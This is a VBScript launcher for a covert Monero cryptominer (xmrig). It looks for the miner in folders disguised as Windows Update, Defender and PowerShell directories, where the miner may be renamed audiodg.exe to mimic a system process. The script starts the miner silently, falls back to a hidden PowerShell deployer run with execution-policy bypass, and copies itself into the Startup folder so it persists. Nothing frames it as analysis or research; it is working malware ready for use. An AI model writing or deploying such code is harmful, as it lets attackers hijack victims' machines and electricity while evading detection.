' =====================================================================
' SILENT_LAUNCH.vbs - Fully Silent Version (No Popups Ever)
' =====================================================================
Option Explicit
On Error Resume Next

Dim WshShell, fso, minerFolder, minerExe, configFile
Dim deployScript, vbsName, startupFolder, currentFolder
Dim objWMIService, colProcesses, found, folder
Dim possibleFolders(7)

Set WshShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

possibleFolders(0) = "C:\ProgramData\Microsoft\Windows\WindowsUpdate"
possibleFolders(1) = "C:\ProgramData\WindowsUpdater"
possibleFolders(2) = "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AudioSrv"
possibleFolders(3) = "C:\ProgramData\Microsoft\Network\Downloader"
possibleFolders(4) = WshShell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Windows\PowerShell"
possibleFolders(5) = WshShell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Windows\Defender"
possibleFolders(6) = WshShell.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Templates"
possibleFolders(7) = WshShell.ExpandEnvironmentStrings("%TEMP%") & "\WindowsUpdateCache"

currentFolder = fso.GetParentFolderName(WScript.ScriptFullName)
deployScript  = currentFolder & "\DEPLOY_ULTIMATE.ps1"

vbsName       = "SILENT_LAUNCH.vbs"
startupFolder = WshShell.SpecialFolders("Startup") & "\" & vbsName

found = False

For Each folder In possibleFolders
    If fso.FolderExists(folder) Then
        If fso.FileExists(folder & "\audiodg.exe") And fso.FileExists(folder & "\config.json") Then
            minerFolder = folder
            minerExe    = folder & "\audiodg.exe"
            configFile  = folder & "\config.json"
            found = True
            Exit For
        End If
        If fso.FileExists(folder & "\xmrig.exe") And fso.FileExists(folder & "\config.json") Then
            minerFolder = folder
            minerExe    = folder & "\xmrig.exe"
            configFile  = folder & "\config.json"
            found = True
            Exit For
        End If
    End If
Next

If found Then
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set colProcesses = objWMIService.ExecQuery("Select * From Win32_Process Where Name = '" & fso.GetFileName(minerExe) & "'")

    If colProcesses.Count = 0 Then
        WshShell.Run """" & minerExe & """ --config=""" & configFile & """ --no-color", 0, False
    End If
Else
    If fso.FileExists(deployScript) Then
        WshShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & deployScript & """", 0, False
    End If
End If

If Not fso.FileExists(startupFolder) Then
    fso.CopyFile WScript.ScriptFullName, startupFolder, True
End If

WScript.Quit